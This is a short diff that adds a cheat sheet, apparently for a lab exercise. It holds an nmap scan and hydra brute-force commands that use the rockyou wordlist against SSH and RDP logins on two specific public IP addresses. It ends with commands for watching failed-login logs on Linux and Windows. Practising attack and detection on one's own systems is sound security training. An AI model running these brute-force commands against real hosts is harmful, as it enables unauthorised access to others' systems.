@@ -1,0 +1,14 @@
+# Nmap Scan
+nmap 3.20.114.27
+
+# SSH Brute Force
+hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://3.20.114.27
+
+# RDP Brute Force
+hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://3.17.112.130
+
+# Linux Logs
+sudo tail -f /var/log/auth.log
+
+# Windows Logs
+Event Viewer → Security → Event ID 4625
